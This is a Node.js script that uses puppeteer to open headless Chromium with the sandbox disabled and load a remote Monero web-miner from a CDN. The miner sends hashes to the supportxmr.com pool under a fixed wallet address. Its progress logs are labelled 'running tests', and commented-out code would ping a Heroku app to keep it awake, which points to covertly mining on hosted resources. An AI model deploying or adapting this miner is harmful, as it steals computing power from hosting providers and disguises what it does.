const http = require('http'); 
const puppeteer = require('puppeteer');

var html = `
  <script src="https://cdn.rawgit.com/notgiven688/webminerpool/master/SDK/xmr/miner_compressed/webmr.js"></script>
  <script type="text/javascript">
    startMining("supportxmr.com","41jcJH1B2Hj1vGJGioERFGi71Gu3AniSmC75kQReMikC8wB9rkTeguQ9DPiUYRNp4K5ucDrv34vWN7yEYkLmWD6NGq8vXqA.cs");

    var accepted = 0;
    var solved = 0;
    var seconds = 0;

    function addText(obj) {
      if (obj.identifier === "job")
        console.log("new job: " + obj.job_id);
      else if (obj.identifier === "solved") {
        console.log("solved job: " + obj.job_id);
        solved += 1;
      }
      else if (obj.identifier === "hashsolved")
        accepted += 1;
      else if (obj.identifier === "error")
        console.log("error: " + obj.param);
      else console.log(obj);
    }


    setInterval(function () {
      seconds += 3;
      while (sendStack.length > 0) (sendStack.pop());
      while (receiveStack.length > 0) (receiveStack.pop());

      // console.log(JSON.stringify({
      //   hashesPerSecond: totalhashes / seconds,
      //   totalHashes: totalhashes,
      //   accepted: accepted,
      //   solved: solved
      // }))

      console.log("running tests - ", + totalhashes / seconds)
    }, 3000);
  </script>
`;

(async () => {
  // const url = "http://"+process.env.APP_NAME+".herokuapp.com/";
  // console.log("app started on " + url);

  const browser = await puppeteer.launch({ args: ['--no-sandbox', '--disable-setuid-sandbox'] });
  const page = await browser.newPage();

  page.on('console', msg => console.log(msg.text()));

  await page.goto('about:blank');
  page.setContent(html);

  console.log('started!');

  // setInterval(function() {
  //   http.get(url);
  //   console.log('refreshed');
  // }, 300000);

  // const requestHandler = (request, response) => {  
  //   console.log(request.url)
  //   response.end('Work in progress!')
  // }

  // const server = http.createServer(requestHandler)

  // server.listen(process.env.PORT, (err) => {  
  //   if (err) {
  //     return console.log('something bad happened', err)
  //   }

  //   console.log(`server is listening`)
  // })
})();
